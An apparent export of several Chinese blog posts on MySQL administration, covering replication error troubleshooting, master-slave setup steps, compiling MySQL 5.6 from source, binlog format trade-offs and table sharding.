前面说的这几中情况都只在binlog_format=ROW的情况下才有效。 12Last_SQL_Errno: 1194Last_SQL_Error: Error 'Table 'traincenter' is marked as crashed and should be repaired' on query. Default database: 'basketballman'. Query: 'update traincenter set points='4',pointstime='1361912066' where uid = '1847482697' limit 1' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：myisam表traincenter损坏，直接repair table即可。至于为什么myisam类型表比innodb更容易损坏，我觉得有两个原因：1，innodb有double write机制，损坏或者half write的页可以用它恢复，第二innodb是事务引擎，都有操作都是事务的，而myisam是非事务的，存在写一半但是操作终止情况。 12Last_IO_Errno: 1236Last_IO_Error: Got fatal error 1236 from master when reading data from binary log: 'Could not find first log file name in binary log index file' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：主库上的binlog文件已经不存在但是在index file中确有相应记录存在。我这里发生这个错误的原因在于由于复制中断时间很长，报警出来一直没人处理，这个中断时间超过master上binlog超期时间，等恢复复制时需要的binlog已经由于其超期而被删掉，没办法只好重建这个实例了。以大家都要引以为戒。 12Last_IO_Errno: 1593Last_IO_Error: Fatal error: The slave I/O thread stops because master and slave have equal MySQL server ids; these ids must be different for replication to work (or the --replicate-same-server-id option must be used on slave but this does not always make sense; please check the manual before using it). &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：主从配置的server-id一样，而在主从复制环境中server-id一样的binlog events都会被过滤掉。具体server-id的含义可以了解一下复制原理。这个一般是因为拷贝配置文件时忘记修改server-id导致，遇到这类问题也比较容易，平时操作谨慎一点即可。 12Last_Errno: 1053Last_Error: Query partially completed on the master (error on master: 1053) and was aborted. There is a chance that your master is inconsistent at this point. If you are sure that your master is ok, run this query manually on the slave and then restart the slave with SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1; START SLAVE; . Query: 'insert into ... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：查询在master上部分完成，然后终止了。这马上又能想到是myisam表，结果也正是这样。由于myisam不支持事务所以可能存在一个查询完成一部分然后失败的情况。解决方法一般也就是提示信息给出的跳过一个binlog event。不过确认跳过之前最好还是查询一下master上是否真的存在相应的记录，因为错误信息同时还会给出它认为在master上执行一部分然后终止的查询语句。 12Last_SQL_Errno: 1666Last_SQL_Error: Error executing row event: 'Cannot execute statement: impossible to write to binary log since statement is in row format and BINLOG_FORMAT = STATEMENT.' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：这个案例的背景是做一个ABC结构的复制，B、C中设定的binlog_format=statement，A中的是MIXED，所以当B尝试重做A过来的relay log，然后记录binlog（传给C）时发现relay log的binlog_format与自己设定的binlog_format不一致。我当时就是直接先更改BC的binlog_format=MIXED解决。 12Last_Errno: 1032Last_Error: Could not execute Update_rows event on table db.table; Can't find record in 'table', Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event's master log mysql-bin.000064, end_log_pos 158847 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：这个是在binlog_format=row复制下发生的。原因是因为row格式复制是最严格的，所以在mysql看来如果在从库上找不到要更新的这条记录，那么就代表主从数据不一致，因此报错。另外顺便说一句，对于row格式binlog，如果某个更新操作实际上并没有更新行，这个操作是不会记binlog的，因为row格式的binlog宗旨就是只记录发生了改变的行。所以这个解决办法根据你自己实际应用来定，最好的方法还是重做slave吧，这样更放心。 12Last_Errno: 28Last_Error: Error in Append_block event: write to '/tmp/SQL_LOAD-32343798-72213798-1.data' failed &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法： 首先说错误原因：主库执行load data infile，同步到从库后load data infile存放的文件默认是放在/tmp(由参数slave_load_tmpdir控制)，而/tmp空间不够因此报错。因此只要将从库上slave_load_tmpdir设置到一个磁盘空间足够大的分区就行。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql 主从复制]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F23.%20mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%2F</url>
    <content type="text"><![CDATA[mysql主从复制mysql复制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL复制支持单向，异步复制。通过一台主服务器将更新写入二进制日志文件，并维护文件的一个索引以跟踪日志循环。这些日志可以记录发送到从服务器的更新。当一个从服务器连接主服务器时，它通知主服务器从服务器在日志中读取的最后一次成功更新的位置。从服务器接收从那时起发生的任何更新，然后封锁并等待主服务器通知新的更新。MySQL主从复制是异步进行的。同步需要版本为5.5,使用google提供的插件来实现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL主从复制操作很灵活既可以实现整个服务的级别的复制，也可以实现对某个库，甚至某个数据库中的指定的某个对象进行复制。 MySQL主从复制应用场景 提高性能。通过一(多)主多从的部署方案，将涉及数据写的操作放在Master端操作，而将数据读的操作分散到众多的Slave当中。降低了Master的负载，提高数据写入的响应效率；多台从服务器提供读，分担了请求，提高了读的效率。 数据安全。数据复制到Slave节点，即使Master宕机，Slave节点还保存着完整数据。 数据分析。将数据分析，放在slave上。 主从复制的原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL的Replication是一个异步的复制过程，从一个MySQL实例(Master)复制到另一台MySQL实例上。在Master和Slave之间复制的整个过程主要由3个线程完成，其中两个线程（SQL线程和IO线程）在Slave端，另外一个线程(IO线程)在Master端。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要实现主从复制，首先要在Master端打开Binary Log功能。因为整个复制过程实际上 就是Slave从Master上获取二进制日志，然后在自己身上完全按照产生的顺序一次执行日志中记录的各种操作的过程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制的具体过程如下： Slave的IO线程连上Master，并请求日志文件指定位置(或从开始的日志)之后的日志的内容。 Master接收到来自Slave的IO线程请求后，负责复制IO线程根据请求的信息读取指定日志之后的日志信息，返回给Slave端的IO线程。返回信息中除了日志所包含的信息，还包含了包括本次返回的信息在Master端的Binary Log文件的名称和位置。 Slave的IO线程接受到信息后，将日志内容一次写入Slave端的Relay Log文件(mysql-relay-bin.xxxx)的末端，并将读取到的Master端的bin-log的文件和位置记录到master-info文件中，以便在下一次读取时能够清楚地告诉Master，下次从bin-log哪个位置开始往后的日志内容。 Slave的SQL线程检测检测到Relay Log中更新内容后，会马上解析该Log文件中的内容，还原成在Master端真实执行时的可执行的SQL语句，并执行这些SQK语句。实际上Master和Slave执行同样的语句。 Binary Log 记录方式Row Level&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Binary Log会记录成每一行数据被修改的形式，然后在Slave端再对相同的数据进行修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：在Row Level模式下，Binnary Log可以不记录执行的Query语句的上下文相关信息，只要记录哪一行修改了，修改成什么样子。Row Level会详细的记录下每一行数据的修改细节，而且不会出现某个特定情况下的存储过程，或Function，以及Trigger的调用和触发无法被正确复制问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：产生大量的日志内容。 Statment Level&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一条会修改的SQL语句都会记录到Master的Binnary中。Slave端在复制的时候，SQL线程会解析成和原来Master端执行过相同的SQL语句，并再次执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点：首先，解决了Row Level下的缺点，不须要记录每一行的数据变化，减少了Binnary Log日志量，节约了IO成本，提高了性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点：由于它是记录的执行语句，为了让这些语句在Slave端也能正确执行。那么它还必须记录每条语句在执行时的一些相关信息，即上下文信息，以保证所有语句在Slave端被执行的时候能够得到和在Master端执行时相同的结果。另外，由于MySQL发展比较快，很多新功能不断加入，使得MySQL复制遇到了不小的挑战，复制时设计的内容岳父在，越容易出bug。在Statement Level下，目前已发现不少的情况下会造成MySQL的复制问题。主要是在修改数据使用了某些特定的函数货功能后，出现，比如：Sleep()函数在有些版本中就不能正确的复制，在存储过程中使用了last_insert_id()函数，可能会使Slave和Master的到不一致的ID，等等。 Mixed Level&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Mixed模式下，MySQL会根据执行的每一条具体的SQL语句来区分对待记录的日志形式，也就是在Statement和Row之间选择一种。除了MySQL认为通过Statement方式可能造成复制过程中Master和Slave之间产生不一致数据。(如特殊Procedure和Funtion的使用，UUID()函数的使用等特殊情况)时，它会选择ROW的模式来记录变更之外，都会使用Statement方式。 设置主从&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主从设置的主要步骤是 修改Master和Slave的my.cnf中的server-id，使之唯一,开启binlog。 若不停Master时，加入全局锁，记录bin-log文件和bin-log文件的位置，全备要同步的数据库；解除全局锁 若可以停库时，停止主库，物理备份所需要同步的数据库。 在Slave端恢复备份的数据。 用change master在Slave建立与master的联系。 启动Slave。 检查Slave的状态。 实例 不停主库的建立主从复制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一部分 对主库的操作 修改主库的文件，开启MySQL的bin-log。（一般安装的时候最好先做好，这样可以不停库。）修改主库的配置文件my.cnf： 123456vim /etc/my.cnfserver-id = 1 # 设置server-id 确保id为唯一，最好用ip地址，后三位bin-log=mysql-bin # 设置 bin-log，这地方可以指定为bin-log的目录？/etc/init.d/mysqld restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改完成后，重启mysql 登录主库，添加从库的同步账号。 12mysql –uroot –pgrant replication slave on *.* to 'rep'@'%' identified by 'passwd'; 对主库进行锁表操作，禁止更新，（为了防止备份时的数据不一致问题）。并查看bin-log的名字和日志的（position）。 123456789101112flush tables with read lock；show master status；mysql&gt; show master status;+------------------+----------+--------------+------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB |+------------------+----------+--------------+------------------+| mysql-bin.000107 | 38874616 | | |+------------------+----------+--------------+------------------+1 row in set (0.00 sec)mysql&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;记录这两个值 12mysql-bin.00010738874616 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;取得bin-log 和 position 1mysql -uroot -p'yz11235' -e "show master status" | awk '&#123;if (NR == 2)&#123; print $1 "\n" $2;&#125;&#125;' &gt; temp.txt 对主库进行全备份。 1mysqldump -h hostname -uroot -p’’ -A -B -F | gzip &gt;alldb.sql.gz 导出数据库后，进行对数据库表解锁。 1unlock tables &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二部分 从库上操作 在从库上设置my.cnf，设置server-id，和注释bin-log。 12server-id = 2# bin-log = mysql-bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 mysql。 登录从库，并设置从库信息 12345678CHANGE MASTER TO MASTER_HOST='10.143.39.174',MASTER_PORT=3306,MASTER_USER='rep',MASTER_PASSWORD='passwd',MASTER_LOG_FILE='mysql-bin.000003',MASTER_LOG_POS=151348020,MASTER_CONNECT_RETRY=10; 启动 从库 1start slave; 查看从库状态， 1show slave status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;观察： 12slave_IO_Running : YesSlave_SQL_Running : Yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上两个为Yes 说明主从已经成功。 1Second_behind_master = 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是从库落后主库的秒数。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[源码编译安装MySQL5.6报错及解决方法]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F3.%20%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85MySQL5.6%E6%8A%A5%E9%94%99%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[源码编译安装MySQL5.6报错及解决方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以前都是mysql5.1做的LAMP搭建，比较顺利。试了一下安装mysql5.6. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于系统没有cmake命令，于是 yum install -y cmake 进行安装 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在cmake这里 1cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/data/mysql_data -DMYSQL_UNIX_ADDR=/usr/local/mysql/mysql.sock -DSYSCONFDIR=/etc -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;报错如下： 12345678-- Could NOT find Curses (missing: CURSES_LIBRARY CURSES_INCLUDE_PATH)CMake Error at cmake/readline.cmake:82 (MESSAGE): Curses library not found. Please install appropriate package, remove CMakeCache.txt and rerun cmake.On Debian/Ubuntu, package name is libncurses5-dev, on Redhat and derivates it is ncurses-devel.Call Stack (most recent call first): cmake/readline.cmake:126 (FIND_CURSES) cmake/readline.cmake:216 (MYSQL_USE_BUNDLED_LIBEDIT) CMakeLists.txt:250 (MYSQL_CHECK_READLINE) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法： 123[root@localhost mysql-5.6.1]# rm CMakeCache.txt[root@localhost mysql-5.6.1]# yum install -y ncurses-devel[root@localhost mysql-5.5.11]# yum install -y bison &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接着继续执行编译 12cmake......make &amp;&amp; make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译完成，安装好之后。新建系统用户mysql，并禁止登录 1useradd -s /sbin/nologin mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建立数据库存放目录 12mkdir -p /data/mysql_datachown -R mysql:mysql /data/mysql_data &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进行数据库初始化 1234567cd /usr/local/mysql./scripts/mysql_install_db --user=mysql --datadir=/data/mysql_datacp support-files/my-large.cnf /etc/my.cnf cp support-files/mysql.server /etc/init.d/mysqldchmod 755 /etc/init.d/mysqld vim /etc/init.d/mysqld //添加datadir=路径service mysqld start -------------------------------服务启动报错 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;报错信息如下 12[root@centos6 mysql_data]# service mysqld startStarting MySQL...The server quit without updating PID file [失败]/mysql_data/centos6.6.pid). &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法：根据报错信息，怀疑可能文件丢失造成的原因，对比另一个测试机已经搭建好的环境，检查同样的数据库目录下，发现本机少了一个centos6.6.pid文件 12345cd /data/mysql_data //数据库文件存放目录vi centos6.6.pid //编辑此文件，添加一个pid号码1583 保存退出。 //1583是我在系统中随意添加的号，只要保证系统进程里没有的ID都可以service mysqld start 正常启动 ----------------------------成功解决]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql5.1的RBR和SBR的优缺点]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F31.%20mysql5.1%E7%9A%84RBR%E5%92%8CSBR%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9%2F</url>
    <content type="text"><![CDATA[mysql5.1的RBR和SBR的优缺点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL 5.1 中，在复制方面的改进就是引进了新的复制技术：基于行的复制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简言之，这种新技术就是关注表中发生变化的记录，而非以前的照抄 binlog 模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从 MySQL 5.1.12 开始，可以用以下三种模式来实现： 基于SQL语句的复制(statement-based replication, SBR) 基于行的复制(row-based replication, RBR) 混合模式复制(mixed-based replication, MBR)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相应地，binlog的格式也有三种： STATEMENT ROW MIXED &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MBR 模式中，SBR 模式是默认的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在运行时可以动态的改变binlog的格式，以下几种情况不能动态修改binlog格式： 存储过程或者触发器中间。 使用NDB engine类型的表 。 当前会话试用RBR模式，并且已打开了临时表。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果binlog采用了MIXED 模式，那么在以下几种情况下会自动将binlog的模式由 SBR模式改成RBR模式。 当DML语句更新一个NDB engine表时。 当写操作中包含UUID()函数时。 2个或两个以上包含AUTO_INCREMENT字段的表被更新时。 进行INSERT DELAYED语句操作数据时。 使用UDF时。 视图中必须要求使用RBR时，例如创建视图是使用了UUID()函数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定主从复制模式的方法非常简单，只要在以前设定复制配置的基础上，再加一个参数： 1binlog_format='STATEMENT' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或 1binlog_format='ROW' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或 1binlog_format='MIXED' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在线动态修改binlog的格式。 123456mysql&gt; SET SESSION binlog_format = 'STATEMENT';mysql&gt; SET SESSION binlog_format = 'ROW';mysql&gt; SET SESSION binlog_format = 'MIXED';mysql&gt; SET GLOBAL binlog_format = 'STATEMENT';mysql&gt; SET GLOBAL bin log_format = 'ROW';mysql&gt; SET GLOBAL binlog_format = 'MIXED'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SBR和RBR两种模式各自的优缺点： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SBR 的优点： 历史悠久，技术成熟。 binlog文件较小。 binlog中包含了所有数据库更改信息，可以据此来审核数据库的安全等情况。 binlog可以用于实时的还原，而不仅仅用于复制。 主从版本可以不一样，从服务器版本可以比主服务器版本高。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SBR 的缺点： 不是所有的UPDATE语句都能被复制，尤其是包含不确定操作的时候。 调用具有不确定因素的 UDF 时复制也可能出问题 使用以下函数的语句也无法被复制： LOAD_FILE() UUID() USER() FOUND_ROWS() SYSDATE() (除非启动时启用了 –sysdate-is-now 选项) INSERT … SELECT 会产生比 RBR 更多的行级锁 复制需要进行全表扫描(WHERE 语句中没有使用到索引)的 UPDATE 时，需要比 RBR 请求更多的行级锁 对于有 AUTO_INCREMENT 字段的 InnoDB表而言，INSERT 语句会阻塞其他 INSERT 语句 对于一些复杂的语句，在从服务器上的耗资源情况会更严重，而 RBR 模式下，只会对那个发生变化的记录产生影响 存储函数(不是存储过程)在被调用的同时也会执行一次 NOW() 函数，这个可以说是坏事也可能是好事 确定了的 UDF 也需要在从服务器上执行 数据表必须几乎和主服务器保持一致才行，否则可能会导致复制出错 执行复杂语句如果出错的话，会消耗更多资源 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RBR 的优点： 任何情况都可以被复制，这对复制来说是最安全可靠的 和其他大多数数据库系统的复制技术一样 多数情况下，从服务器上的表如果有主键的话，复制就会快了很多 复制以下几种语句时的行锁更少： INSERT … SELECT 包含 AUTO_INCREMENT 字段的 INSERT 没有附带条件或者并没有修改很多记录的 UPDATE 或 DELETE 语句 执行 INSERT，UPDATE，DELETE 语句时锁更少 - 从服务器上采用多线程来执行复制成为可能 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RBR 的缺点： binlog 大了很多 复杂的回滚时 binlog 中会包含大量的数据 主服务器上执行 UPDATE 语句时，所有发生变化的记录都会写到 binlog 中，而 SBR 只会写一次，这会导致频繁发生 binlog 的并发写问题 UDF 产生的大 BLOB 值会导致复制变慢 无法从 binlog 中看到都复制了写什么语句 当在非事务表上执行一段堆积的SQL语句时，最好采用 SBR 模式，否则很容易导致主从服务器的数据不一致情况发生 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，针对系统库 mysql 里面的表发生变化时的处理规则如下： 如果是采用 INSERT，UPDATE，DELETE 直接操作表的情况，则日志格式根据 binlog_format 的设定而记录 如果是采用 GRANT，REVOKE，SET PASSWORD 等管理语句来做的话，那么无论如何都采用 SBR 模式记录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：采用 RBR 模式后，能解决很多原先出现的主键重复问题。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql一主多从同步配置]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F32.%20mysql%E4%B8%80%E4%B8%BB%E5%A4%9A%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[mysql一主多从同步配置一、环境&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master：192.168.101&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MYSQL版本：5.1.48-community-log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slave1:192.168.2.182&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MYSQL版本：5.1.48-community-log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;slave2:192.168.2.111&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MYSQL版本：5.1.48-community-log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;so…1 vs 2。 二、master和 slave上的相关配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3台上都一样： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在/etc目录下可能无my.cnf文件，从/user/share/mysql目录中拷贝my-medium.cnf 到/etc并修改成my.cnf 1234[root@localhost etc]# cp /usr/share/mysql/my-medium.cnf my.cnf[root@localhost etc]# ll |grep my-rwxr-xr-x 1 root root 5204 Feb 13 22:52 my_bak-rwxr-xr-x 1 root root 4765 Jul 10 23:07 my.cnf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;master 上; 1[root@mysql101 ~]# vi /etc/my.cnf 1.修改master上的配置文件my.cnf。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在[mysqld]下添加如下字段： 12345server-id = 1log-bin=mysql-binbinlog-do-db=YYY //需要同步的数据库binlog-ignore-db=mysql //被忽略的数据库binlog-ignore-db=information-schema //被忽略的数据库 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在master上为slave添加一个同步账号 1234mysql&gt; grant replication slave on *.* to 'affairlog'@'192.168.2.182' identified by 'pwd123';//在slave1上登陆成功mysql&gt; grant replication slave on *.* to 'affairlog'@'192.168.2.111' identified by 'pwd123';//在slave2上登陆成功 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，重启master的mysql服务： 1service mysql restart; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用show master status命令查看日志情况 1234567mysql&gt; show master status\G;*************************** 1. row ***************************File: mysql-bin.000087Position: 106Binlog_Do_DB: YYYBinlog_Ignore_DB: mysql,information-schema1 row in set (0.00 sec) 2.修改slave1上的配置文件my.cnf。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在[mysqld]下添加如下字段 12345678910[root@mysql182 ~]# vi /etc/my.cnfserver-id=182master-host=192.168.3.101master-user= affairlogmaster-password=pwd123master-port=3306master-connect-retry=60replicate-do-db=YYY //同步的数据库replicate-ignore-db=mysql //被忽略的数据库replicate-ignore-db=information-schema //被忽略的数据库 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，重启slave的mysql服务： 1service mysql restart; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改slave2上的配置文件my.cnf，和上面类似，只是把server-id改下，为了方便，我都用了相应的ip某位， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，slave2上我设置的server-id是111。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在进入两个slave机中的mysql。 123456789101112131415161718192021222324252627282930313233343536373839404142mysql&gt;start slave;mysql&gt;show slave status\G;*************************** 1. row ***************************Slave_IO_State: Waiting for master to send eventMaster_Host: 192.168.3.101Master_User: affairlogMaster_Port: 3306Connect_Retry: 60Master_Log_File: mysql-bin.000087Read_Master_Log_Pos: 106Relay_Log_File: vm111-relay-bin.000002Relay_Log_Pos: 251Relay_Master_Log_File: mysql-bin.000087Slave_IO_Running: YesSlave_SQL_Running: YesReplicate_Do_DB: YYYReplicate_Ignore_DB: mysql,information-schemaReplicate_Do_Table:Replicate_Ignore_Table:Replicate_Wild_Do_Table:Replicate_Wild_Ignore_Table:Last_Errno: 0Last_Error:Skip_Counter: 0Exec_Master_Log_Pos: 106Relay_Log_Space: 406Until_Condition: NoneUntil_Log_File:Until_Log_Pos: 0Master_SSL_Allowed: NoMaster_SSL_CA_File:Master_SSL_CA_Path:Master_SSL_Cert:Master_SSL_Cipher:Master_SSL_Key:Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: NoLast_IO_Errno: 0Last_IO_Error:Last_SQL_Errno: 0Last_SQL_Error:1 row in set (0.00 sec) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果两个slave中的Slave_IO_Running、Slave_SQL_Running状态均为Yes则表明设置成功。 三、可能遇到的问题：问题1：Slave_IO_Running: No或者Slave_SQL_Running: No停掉slave服务12mysql&gt; slave stop;Query OK, 0 rows affected (2.01 sec) 解决办法 在master上查看。 1234567mysql&gt; show master status\G;*************************** 1. row ***************************File: mysql-bin.000087Position: 1845Binlog_Do_DB: YYYBinlog_Ignore_DB: mysql,information-schema1 row in set (0.00 sec) 到slave上手动同步。 1234567mysql&gt;change master to&gt;master_host='192.168.3.101',&gt;master_user='affairlog',&gt;master_password='pwd123',&gt;master_log_file='mysql-bin.000087',&gt;master_log_pos=1845;Query OK, 0 rows affected (0.00 sec) 启动slave服务1mysql&gt; slave start; 再次查看Slave_IO_Running、Slave_SQL_Running状态，为Yes则表明设置成功。问题2：RROR 1198 (HY000): This operation cannot be performed with a running slave; run STOP SLAVE first&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;错误重现： 1234567mysql&gt;change master to&gt;master_host='192.168.3.101',&gt;master_user='affairlog',&gt;master_password='pwd123',&gt;master_log_file='mysql-bin.000087',&gt;master_log_pos=1845;ERROR 1198 (HY000): This operation cannot be performed with a running slave; run STOP SLAVE first &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法： 停掉slave服务 12mysql&gt; slave stop;Query OK, 0 rows affected (2.01 sec) 重置slave服务 12mysql&gt; reset stop;Query OK, 0 rows affected (2.01 sec) 再执行一次change命令 1234567mysql&gt;change master to&gt;master_host='192.168.3.101',&gt;master_user='affairlog',&gt;master_password='pwd123',&gt;master_log_file='mysql-bin.000087',&gt;master_log_pos=1845;Query OK, 0 rows affected (0.00 sec) 启动slave服务 1mysql&gt; slave start; 5．再次查看Slave_IO_Running、Slave_SQL_Running状态，为Yes则表明设置成功。 PS：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Slave_IO_Running：连接到主库，并读取主库的日志到本地，生成本地日志文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Slave_SQL_Running:读取本地日志文件，并执行日志里的SQL命令。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql分库分表方案]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F25.%20Mysql%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[Mysql分库分表方案为什么要分表：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当一张表的数据达到几千万时，你查询一次所花的时间会变多，如果有联合查询的话，我想有可能会死在那儿了。分表的目的就在于此，减小数据库的负担，缩短查询时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql中有一种机制是表锁定和行锁定，是为了保证数据的完整性。表锁定表示你们都不能对这张表进行操作，必须等我对表操作完才行。行锁定也一样，别的sql必须等我对这条数据操作完了，才能对这条数据进行操作。 mysql proxy：amoeba&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做mysql集群,利用amoeba。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上层的java程序来讲，不需要知道主服务器和从服务器的来源，即主从数据库服务器对于上层来讲是透明的。可以通过amoeba来配置。 大数据量并且访问频繁的表，将其分为若干个表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如对于某网站平台的数据库表-公司表，数据量很大，这种能预估出来的大数据量表，我们就事先分出个N个表，这个N是多少，根据实际情况而定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;某网站现在的数据量至多是5000万条，可以设计每张表容纳的数据量是500万条，也就是拆分成10张表， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么如何判断某张表的数据是否容量已满呢？可以在程序段对于要新增数据的表，在插入前先做统计表记录数量的操作，当&lt;500万条数据，就直接插入，当已经到达阀值，可以在程序段新创建数据库表（或者已经事先创建好），再执行插入操作。 利用merge存储引擎来实现分表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要把已有的大数据量表分开比较痛苦，最痛苦的事就是改代码，因为程序里面的sql语句已经写好了。用merge存储引擎来实现分表, 这种方法比较适合.举例子： 